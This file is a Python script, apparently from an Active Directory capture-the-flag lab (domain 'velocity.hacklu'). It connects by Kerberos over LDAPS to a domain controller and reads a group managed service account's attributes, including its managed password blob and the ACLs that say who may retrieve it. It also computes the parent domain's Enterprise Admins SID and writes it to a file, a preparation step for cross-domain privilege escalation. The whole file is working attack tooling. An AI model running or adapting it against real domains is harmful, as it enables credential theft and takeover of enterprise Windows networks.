import os
import ssl
from pathlib import Path
from ldap3 import Connection, Server, Tls, SASL, GSSAPI, NONE, BASE
from ldap3.protocol.microsoft import security_descriptor_control
from impacket.ldap.ldaptypes import SR_SECURITY_DESCRIPTOR

server=Server('10.244.0.10',port=636,use_ssl=True,tls=Tls(validate=ssl.CERT_NONE),connect_timeout=12,get_info=NONE)
c=Connection(server,authentication=SASL,sasl_mechanism=GSSAPI,sasl_credentials=('dc-new.velocity.hacklu',),receive_timeout=20)
print('bind',c.bind(),c.result,flush=True)
dn='CN=svc_backup_gmsa,CN=Managed Service Accounts,DC=velocity,DC=hacklu'
attrs=['sAMAccountName','description','servicePrincipalName','msDS-ManagedPassword','msDS-GroupMSAMembership','nTSecurityDescriptor','objectSid','memberOf']
print('search',c.search(dn,'(objectClass=*)',search_scope=BASE,attributes=attrs,controls=security_descriptor_control(sdflags=4)),c.result,flush=True)
e=c.entries[0]
raw_sid=e.entry_raw_attributes.get('objectSid',[b''])[0]
revision=raw_sid[0]
authority=int.from_bytes(raw_sid[2:8],'big')
subauths=[int.from_bytes(raw_sid[8+i*4:12+i*4],'little') for i in range(raw_sid[1])]
parent_domain_sid='S-%d-%d-%s' % (revision,authority,'-'.join(str(x) for x in subauths[:-1]))
parent_ea_sid=parent_domain_sid+'-519'
print('parent Enterprise Admins SID',parent_ea_sid,flush=True)
sid_path=os.environ.get('AD13_PARENT_EA_SID_FILE')
if sid_path:
 Path(sid_path).write_text(parent_ea_sid,encoding='ascii')
print('attrs', {k:v for k,v in e.entry_attributes_as_dict.items() if k not in ('msDS-GroupMSAMembership','nTSecurityDescriptor','msDS-ManagedPassword')},flush=True)
for attr in ('msDS-GroupMSAMembership','nTSecurityDescriptor'):
 raw=e.entry_raw_attributes.get(attr,[])
 print('\nSD',attr,'count',len(raw),'lengths',[len(x) for x in raw],flush=True)
 if not raw: continue
 sd=SR_SECURITY_DESCRIPTOR(data=raw[0]); print('control',hex(int(sd['Control'])),'owner',sd['OwnerSid'].formatCanonical() if sd['OwnerSid'] else None,flush=True)
 d=sd['Dacl']
 if d:
  for ace in d.aces:
   b=ace['Ace']; sid=b['Sid'].formatCanonical() if 'Sid' in b.fields else '?'; mask=int(b['Mask']['Mask']) if 'Mask' in b.fields else 0
   print('ACE',ace['AceType'],hex(mask),sid,'flags',b.fields.get('Flags',''),flush=True)
raw=e.entry_raw_attributes.get('msDS-ManagedPassword',[])
print('\nmanagedPassword raw count',len(raw),'lengths',[len(x) for x in raw],flush=True)
c.unbind()
